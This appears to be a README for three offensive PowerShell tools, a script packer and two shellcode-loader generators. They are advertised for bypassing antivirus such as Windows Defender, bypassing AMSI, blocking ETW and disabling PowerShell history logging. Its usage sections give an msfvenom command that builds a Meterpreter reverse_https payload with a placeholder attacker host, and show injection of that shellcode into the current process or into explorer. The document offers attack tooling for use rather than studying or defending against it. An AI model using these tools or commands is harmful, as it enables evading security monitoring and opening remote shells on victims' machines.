--------------------------------------
### Invoke-PoSH-Packer.ps1
--------------------------------------
'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts in order to bypass AV solutions such as Windows Defender.

> Features
  - AES encryption and GZip compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  
> Usage
  - Import-Module ./Invoke-PoSH-Packer.ps1
  - Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
  Or  
  - Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1

> License
  - GNU General Public License v3.0

--------------------------------------
### Invoke-PoSH-ShellCodeLoader1.ps1
--------------------------------------
'Invoke-PoSH-ShellCodeLoader1' is a simple shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted shellode loader script that will inject the shellcode into the current process's virtual address space.  
The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)

> Features
  - Shellcode injection into the memory of the current process (PowerShell)
  - AES encryption and GZip compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging

> Usage (examples)
  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode
  - Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
  - Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1  
  Or  
  - Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellcodeLoader.ps1
  
> License
  - GNU General Public License v3.0

--------------------------------------
### Invoke-PoSH-ShellCodeLoader2.ps1
--------------------------------------
'Invoke-PoSH-ShellCodeLoader2' is a simple shellcode loader generator that aims to bypass AV solutions such as Windows Defender.  
It generates an obfuscated and encrypted shellode loader script that will inject the shellcode into a target process's virtual address space.  
The shellcode needs to be generated with the format 'ps1' (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)

> Features
  - Shellcode injection into the memory of a target process
  - AES encryption and GZip compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging

> Usage (examples)
  - msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=X.X.X.X LPORT=443 -a x64 -f ps1 -o shellcode
  - Import-Module ./Invoke-PoSH-ShellCodeLoader2.ps1
  - Invoke-PoSH-ShellCodeLoader2 -FileUrl https://URL/shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1  
  Or  
  - Invoke-PoSH-ShellCodeLoader2 -FilePath C:\path\shellcode -TargetProcess explorer -OutFile C:\path\Packed-ShellcodeLoader.ps1

> License
  - GNU General Public License v3.0
